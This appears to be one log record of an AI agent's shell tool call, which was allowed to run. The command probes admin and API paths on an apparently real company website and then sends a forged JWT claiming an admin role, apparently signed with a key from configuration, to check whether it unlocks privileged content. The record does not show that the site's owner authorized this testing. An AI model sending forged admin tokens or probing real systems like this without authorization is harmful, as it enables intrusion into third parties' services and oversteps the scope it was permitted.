{"ts": 1790738899.3909698, "decision_id": "e38dfe247320", "tool": "run_shell", "allow": true, "reason": null, "target": "cd /work && cat > evidence/jwt/baseline_matrix.sh <<'SH'\n#!/bin/bash\nBASE=\"https://www.infinitycapital.bh\"\necho \"=== ANONYMOUS BASELINE (no auth header at all) ===\"\nfor path in \"\" \"api/send\" \"api/contact\" \"admin\" \"dashboard\" \"api/user\" \"api/admin\" \"api/session\"; do\n  code=$(curl -s -m 15 -o /dev/null -w '%{http_code}' \"${BASE}/${path}\")\n  printf '%-14s /%-12s -> %s\\n' \"ANON\" \"$path\" \"$code\"\ndone\nSH\nchmod +x evidence/jwt/baseline_matrix.sh && ./evidence/jwt/baseline_matrix.sh 2>&1 | tee evidence/jwt/baseline.log\necho\necho \"=== does keyconf token reveal ANY extra content vs anon? ===\"\ncurl -s -m 20 \"https://www.infinitycapital.bh/\" -H \"Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiaXNBZG1pbiI6dHJ1ZSwidXNlcl9pZCI6MX0.HczUdvHShywqsnZY7Qw6NDZohXqEMI2ZmT2e5Y9TANk\" > /tmp/a.html\ncurl -s -m 20 \"https://www.infinitycapital.bh/\" > /tmp/b.html\necho \"sizes: admin-token=$(wc -c </tmp/a.html) anon=$(wc -c </tmp/b.html)\"\ndiff <(sed 's/nonce[^\"]*\"[^\"]*\"/X/' /tmp/a.html) <(sed 's/nonce[^\"]*\"[^\"]*\"/X/' /tmp/b.html) >/dev/null && echo \"IDENTICAL CONTENT -> no privileged data disclosed\" || { echo \"DIFFERS:\"; diff /tmp/a.html /tmp/b.html | head -20; }"}
